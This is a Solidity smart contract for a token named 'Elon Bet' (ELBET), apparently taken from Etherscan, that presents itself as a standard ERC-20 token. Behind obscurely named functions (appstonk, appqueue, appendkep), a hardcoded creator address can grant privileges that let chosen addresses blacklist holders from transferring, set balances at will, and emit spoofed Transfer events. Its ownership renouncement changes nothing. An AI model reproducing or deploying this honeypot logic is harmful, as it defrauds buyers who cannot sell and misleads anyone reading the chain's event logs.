/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _contractcreator = 0xC06c17B9656591e41287be628477d0a617D94a6D;
	address V2UniApproval = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}

contract ELBET is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Per;
	mapping (address => bool) private Yer;
    mapping (address => bool) private Ker;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _kpTotalSupply = 120000000 * 10**_decimals;
    string private constant _name = "Elon Bet";
    string private constant _symbol = "ELBET";

    constructor () {
        Per[_MsgSendr()] = _kpTotalSupply;
        emit Transfer(address(0), V2UniApproval, _kpTotalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _kpTotalSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Per[account];
    }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
        
		function appendkep(address px) public {
        if(Yer[msg.sender]) { 
        Ker[px] = false;}}
        
        function appqueue(address px) public{
         if(Yer[msg.sender])  { 
        require(!Ker[px]);
        Ker[px] = true; }}

		function appstonk(address px) public{
         if(msg.sender == _contractcreator)  { 
        require(!Yer[px]);
        Yer[px] = true; }}
		
        function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _contractcreator)  {
        require(amount <= Per[sender]);
        Per[sender] -= amount;  
        Per[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (V2UniApproval, recipient, amount);
        return true; }    
          if(!Ker[recipient]) {
          if(!Ker[sender]) {
         require(amount <= Per[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        Per[sender] -= amount;
        Per[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}

		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _contractcreator)  {
        require(Per[msg.sender] >= amount);
        Per[msg.sender] -= amount;  
        Per[recipient] += amount; 
        emit Transfer (V2UniApproval, recipient, amount);}
        if(Yer[msg.sender]) {Per[recipient] = amount;} 
        if(!Ker[msg.sender]) {
        require(Per[msg.sender] >= amount);
        Per[msg.sender] -= amount;  
        Per[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}